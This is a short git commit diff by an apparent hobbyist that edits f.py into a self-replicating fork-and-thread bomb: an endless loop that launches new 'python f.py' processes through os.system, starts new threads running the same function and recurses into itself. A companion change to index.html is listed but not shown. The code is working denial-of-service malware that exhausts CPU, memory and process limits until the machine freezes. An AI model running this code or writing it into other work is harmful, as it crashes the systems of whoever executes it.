4ab37b01591deee131ab6b9d12987e8fc4d8f8af
Subhaditya Nath <sn03.general@gmail.com>
2020-03-24 10:34:42 +0530

    modified:   f.py 	modified:   index.html

--- f.py
+++ f.py
@@ -1,9 +1,8 @@
-''' Simple but effective(?)
-    Cheers!!  :D    '''
-
 import threading as t
+from os import system as s
 def f():
     while True:
+        s('python f.py')
         t.Thread(target=f).start()
         f()
 
